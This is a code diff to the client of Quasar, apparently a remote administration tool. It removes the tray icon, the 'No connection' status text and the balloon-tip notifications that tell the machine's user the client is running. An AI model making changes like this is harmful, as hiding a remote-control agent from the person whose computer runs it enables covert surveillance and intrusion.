@@ -11,8 +11,6 @@ using Quasar.Common.Messages;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
-using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -77,24 +75,6 @@ namespace Quasar.Client
             ShowInTaskbar = false;
             Run();
             base.OnLoad(e);
-        }
-
-        /// <summary>
-        /// Initializes the notification icon.
-        /// </summary>
-        private void InitializeNotifyicon()
-        {
-            _notifyIcon.Text = "Quasar Client\nNo connection";
-            _notifyIcon.Visible = true;
-            try
-            {
-                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine(ex);
-                _notifyIcon.Icon = SystemIcons.Application;
-            }
         }
 
         /// <summary>
@@ -201,8 +181,6 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Register(msgProc);
-                if (msgProc is NotificationMessageProcessor notifyMsgProc)
-                    notifyMsgProc.ProgressChanged += ShowNotification;
             }
         }
 
@@ -214,19 +192,9 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Unregister(msgProc);
-                if (msgProc is NotificationMessageProcessor notifyMsgProc)
-                    notifyMsgProc.ProgressChanged -= ShowNotification;
                 if (msgProc is IDisposable disposableMsgProc)
                     disposableMsgProc.Dispose();
             }
-        }
-
-        private void ShowNotification(object sender, string value)
-        {
-            if (Settings.UNATTENDEDMODE)
-                return;
-            
-            _notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
         }
 
         protected override void Dispose(bool disposing)
